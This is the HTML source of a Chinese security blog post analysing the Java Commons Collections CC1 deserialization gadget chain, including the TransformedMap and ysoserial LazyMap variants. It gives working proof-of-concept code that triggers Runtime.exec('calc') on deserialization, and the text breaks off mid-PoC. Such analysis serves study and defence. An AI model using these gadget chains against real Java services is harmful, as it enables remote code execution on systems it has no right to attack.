@@ -1,0 +1,788 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, shrink-to-fit=no">
+    <meta name="referrer" content="origin">
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <title>
+        
+            Java利用链CommonCollections1分析
+        
+    </title>
+    <link rel="shortcut icon" href="#"/>
+
+    <link type="text/css" rel="stylesheet" href="/font/LongCang.css">
+    <link type="text/css" rel="stylesheet" href="/font/Monda.css">
+    <link type="text/css" rel="stylesheet" href="/font/NotoSansSC.css">
+    <link type="text/css" rel="stylesheet" href="/font/NotoSerifSC.css">
+    <link type="text/css" rel="stylesheet" href="/font/Playball.css">
+    <link type="text/css" rel="stylesheet" href="/font/PTMono.css">
+    <link type="text/css" rel="stylesheet" href="/font/Roboto.css">
+    <link type="text/css" rel="stylesheet" href="/font/RobotoSlab.css">
+    <link type="text/css" rel="stylesheet" href="/font/Rosario.css">
+    <link type="text/css" rel="stylesheet" href="/font/UbuntuMono.css">
+
+    <link type="text/css" rel="stylesheet" href="/css/base.css">
+    <link type="text/css" rel="stylesheet" href="/css/code.css">
+
+    <script type="text/javascript" src="/js/jquery-3.4.1.min.js"></script>
+<meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="TPA HACK-NOTE" type="application/atom+xml">
+</head>
+<body>
+    <a id="cover"></a>
+    <link type="text/css" rel="stylesheet" href="/css/post.css">
+<div id="header" class="header">
+    <div class="vertical">
+        <div class="inner">
+            
+                <h1 class="header-subtitle">Java利用链CommonCollections1分析</h1>
+                <div class="header-subinfo">
+                    <p class="article-info-text">
+                        <span>
+                            <i class="iconfont icon-time"></i> 发表时间：2024-01-06
+                        </span>
+                        
+                            
+                                <span id="/posts/954915702.html" class="leancloud_visitors" data-flag-title="Java利用链CommonCollections1分析">
+                                    <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
+                                </span>
+                            
+                              
+                        
+                    </p>
+                    
+                        
+                            <span class="category-color">web</span>
+                        
+                    
+                    
+                        
+                            <span class="tag-color">网络安全</span>
+                        
+                    
+                </div>
+            
+        </div>
+    </div>
+    
+</div>
+<div id="container">
+    
+        <!-- 文章页面 -->
+        <div id="article">
+            <div class="toc"></div>
+            <div class="article-body">
+                <h1 id="Java利用链CommonCollections1分析"><a href="#Java利用链CommonCollections1分析" class="headerlink" title="Java利用链CommonCollections1分析"></a>Java利用链CommonCollections1分析</h1><p>初始版本的CC1利用链</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;111&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>成功弹窗</p>
+<p><img src="/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections1%E5%88%86%E6%9E%90.assets/image-20240106153823684.png" alt="image-20240106153823684"></p>
+<p>逐步分析利用链，首先分析</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]</span><br><span class="line">                    &#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h2><p>这是一个接口，声明了transform方法</p>
+<p><img src="/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections1%E5%88%86%E6%9E%90.assets/image-20240106154207977.png" alt="image-20240106154207977"></p>
+<h2 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h2><p>该类实现了Transformer接口，所以也实现了transform方法，该方法的内容是返回构造函数参数的对象</p>
+<p>因为构造的参数是Runtime.getRuntime()所以最终返回的对象是Runtime类</p>
+<p><img src="/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections1%E5%88%86%E6%9E%90.assets/image-20240106154505952.png" alt="image-20240106154505952"></p>
+<h2 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h2><p>InvokerTransformer类同样主要看实现的transform方法</p>
+<p>主要内容是判断参数是否为null，不为null并且没有其它异常则执行方法的调用</p>
+<p>我们的构造参数为（”exec”, new Class[]{String.class},new Object[]{“calc”}）则会执行exec方法，参数为calc就是弹计算器的操作</p>
+<p><img src="/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections1%E5%88%86%E6%9E%90.assets/image-20240106154834154.png" alt="image-20240106154834154"></p>
+<p>再看第二条代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure>
+
+<h2 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h2><p>ChainedTransformer中的transform方法为遍历构造函数参数的Transformer类数组，执行类的transform方法，transform的参数为上一个类transform方法返回的结果</p>
+<p><img src="/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections1%E5%88%86%E6%9E%90.assets/image-20240108133755147.png" alt="image-20240108133755147"></p>
+<p>我们传入的参数是</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>根据前面对ConstantTransformer和InvokerTransformer的transform函数的分析，先执行ConstantTransformer的transorm函数返回Runtime类，再执行InvokerTransformer的transform函数参数为Runtime类，执行Runtime的exec方法弹出计算器</p>
+<p>接下来看如何触发ChainedTransformer</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;111&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h2 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h2><p>TransormedMap底层也是继承了Map，是Map的装饰类，decorate方法</p>
+<p>对Map进行装饰生成TransformedMap，因为构造方法为protected属性无法直接访问所以用decorate获得</p>
+<p><img src="/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections1%E5%88%86%E6%9E%90.assets/image-20240108135106662.png" alt="image-20240108135106662"></p>
+<p>再看TransormedMap的put函数</p>
+<p>执行会触发transformKey和transformValue方法</p>
+<p><img src="/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections1%E5%88%86%E6%9E%90.assets/image-20240108135423472.png" alt="image-20240108135423472"></p>
+<p>现在看下这两个方法，如果值不为null，则触发transform方法，我们设置map的key或value为ChainedTransformer就能成功触发整个利用链</p>
+<p><img src="/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections1%E5%88%86%E6%9E%90.assets/image-20240108135559308.png" alt="image-20240108135559308"></p>
+<p>可是最终的结果是需要反序列化触发的，需要找到一个办法来替代之前通过put方法来手动触发的办法</p>
+<p>找到的这个类就是<code>sun.reflect.annotation.AnnotationInvocationHandler</code></p>
+<h2 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h2><p>因为需要反序列化触发，所以看AnnotationInvocationHandler的ReadObject方法</p>
+<h3 id="在Jdk-8u71以前的版本"><a href="#在Jdk-8u71以前的版本" class="headerlink" title="在Jdk 8u71以前的版本"></a>在Jdk 8u71以前的版本</h3><p><img src="/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections1%E5%88%86%E6%9E%90.assets/image-20240115103039599.png" alt="image-20240115103039599"></p>
+<p>其中的meberValues就是我们传入的TransformedMap对象</p>
+<p>然后进行遍历设值，在Map中有接口Entry&#x3D;&gt;setValue()会直接触发put操作，也就是触发TransformedMap的实现类ChainedTransformer的put，导致利用链执行</p>
+<h3 id="在Jdk-8u71以后的版本的readObject方法"><a href="#在Jdk-8u71以后的版本的readObject方法" class="headerlink" title="在Jdk 8u71以后的版本的readObject方法"></a>在Jdk 8u71以后的版本的readObject方法</h3><p>会新建一个LinkedHashMap，所有的操作会在新的LinkedHashMap中进行，所以导致在Jdk 8u71以后的版本无法利用</p>
+<p><img src="/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections1%E5%88%86%E6%9E%90.assets/image-20240115105535814.png" alt="image-20240115105535814"></p>
+<h2 id="利用TransformedMap的CC1利用链"><a href="#利用TransformedMap的CC1利用链" class="headerlink" title="利用TransformedMap的CC1利用链"></a>利用TransformedMap的CC1利用链</h2><p>在了解完所有类后完整的POC如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections1B</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                String.class,</span><br><span class="line">                Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class,</span><br><span class="line">                Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]</span><br><span class="line">            &#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;</span><br><span class="line">                    <span class="string">&quot;calc&quot;</span> &#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在之前创建Transformer中是直接使用Runtime.getRuntime获得的直接是Runtime类对象java.lang.Runtime</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是该类并没有实现java.io.Serializable所以不支持反序列化</p>
+<p><img src="/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections1%E5%88%86%E6%9E%90.assets/image-20240115121632798.png" alt="image-20240115121632798"></p>
+<p>所以可以通过反射来获取到上下文中的Runtime对象，新的写法就为</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure>
+
+<p>获取的是Runtime.class对象 是java.lang.Class对象</p>
+<p>在之后的内容中触发序列化链</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">      <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">      innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">      <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">      <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">      construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">      </span><br><span class="line">      <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br></pre></td></tr></table></figure>
+
+<p>因为在AnnotationInvocationHandler的readObject方法中需要满足不等于null才会继续执行</p>
+<p><img src="/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections1%E5%88%86%E6%9E%90.assets/image-20240115125319263.png" alt="image-20240115125319263"></p>
+<p>而不满足null的条件是</p>
+<ol>
+<li>sun.reflect.annotation.AnnotationInvocationHandler 构造函数的第一个参数必须是 Annotation的子类，且其中必须含有至少一个方法，假设方法名是A</li>
+<li>被 TransformedMap.decorate 修饰的Map中必须有一个键名为A的元素</li>
+</ol>
+<p>因此用到了Retention.class，该类中有value方法，该类原用于指定注解保留策略</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections1%E5%88%86%E6%9E%90.assets/image-20240115125944093.png" alt="image-20240115125944093"></p>
+<p>在之后进行序列化和反序列化成功弹出计算器，利用CC1链成功</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">oos.writeObject(handler);</span><br><span class="line">oos.close();</span><br><span class="line">System.out.println(barr);</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br></pre></td></tr></table></figure>
+
+<p><img src="/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections1%E5%88%86%E6%9E%90.assets/image-20240115130311130.png" alt="image-20240115130311130"></p>
+<h2 id="ysoserial中利用LazyMap的CC1利用链"><a href="#ysoserial中利用LazyMap的CC1利用链" class="headerlink" title="ysoserial中利用LazyMap的CC1利用链"></a>ysoserial中利用LazyMap的CC1利用链</h2><p>在ysoserial中利用的是LazyMap</p>
+<p><img src="/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections1%E5%88%86%E6%9E%90.assets/image-20240115132617741.png" alt="image-20240115132617741"></p>
+<p>看下LazyMap与TransformedMap一样都是来自Common-Collections库中的，继承AbstractMapDecorator。</p>
+<p><img src="/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections1%E5%88%86%E6%9E%90.assets/image-20240115132704437.png" alt="image-20240115132704437"></p>
+<p>LazyMap是通过get方法进行触发的，LazyMap为懒加载在get不到值的时候调用factory.transform获取value值put到map里并返回value</p>
+<p><img src="/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections1%E5%88%86%E6%9E%90.assets/image-20240115134937850.png" alt="image-20240115134937850"></p>
+<p>但是在AnnotationInvocationHandler的readObject方法中没有直接用到get方法，ysoserial利用了AnnotationInvocationHandler的invoke方法进行调用get</p>
+<p><img src="/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections1%E5%88%86%E6%9E%90.assets/image-20240115143423986.png" alt="image-20240115143423986"></p>
+<p>因为AnnotationInvocationHandler实现InvocationHandler，通过jdk动态代理对该对象进行代理，在readObject反序列化时调用任意方法就会调用invoke方法，从而执行LazyMap的get方法</p>
+<p>对AnnotationInvocationHandler进行Proxy</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br></pre></td></tr></table></figure>
+
+<p>因为最终利用链是需要通过readObject方法来进行触发的，所以readObject方法还是</p>
+<p>入口点，当对象调用到readObject方法里面会调用porxyMap中的相关方法导致invoke触发，所以还要再包裹一层进行传入</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);</span><br></pre></td></tr></table></figure>
+
+<p>最终的POC如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections1C</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span 